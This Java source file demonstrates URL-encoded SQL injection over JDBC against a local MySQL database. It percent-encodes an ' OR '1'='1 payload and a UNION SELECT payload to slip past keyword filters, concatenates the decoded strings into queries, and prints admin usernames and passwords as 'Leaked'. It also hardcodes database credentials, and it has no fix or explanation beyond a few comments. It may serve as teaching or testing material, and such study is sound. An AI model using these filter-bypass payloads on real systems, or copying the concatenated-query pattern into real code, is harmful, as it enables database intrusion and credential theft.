// URL-Encoded SQL Injection via JDBC
// Attacker encodes the payload as percent-encoding to bypass simple keyword filters.

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.net.URLDecoder;

public class url_encoded_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // VULNERABLE: app decodes percent-encoded input before concatenating into SQL
        String encoded = "%27%20OR%20%271%27%3D%271"; // ' OR '1'='1
        String decoded = URLDecoder.decode(encoded, "UTF-8");

        String query = "SELECT * FROM users WHERE username = '" + decoded + "'";
        ResultSet rs = st.executeQuery(query);
        while (rs.next()) {
            System.out.println("URL-encoded bypass: " + rs.getString("username"));
        }

        // Union payload delivered via percent encoding
        String unionEnc = "1%20UNION%20SELECT%20username,password%20FROM%20admins";
        String unionDec = URLDecoder.decode(unionEnc, "UTF-8");
        String unionQuery = "SELECT id, name FROM users WHERE id = " + unionDec;
        ResultSet urs = st.executeQuery(unionQuery);
        while (urs.next()) {
            System.out.println("Leaked: " + urs.getString(1) + " / " + urs.getString(2));
        }

        rs.close();
        urs.close();
        st.close();
        con.close();
    }
}
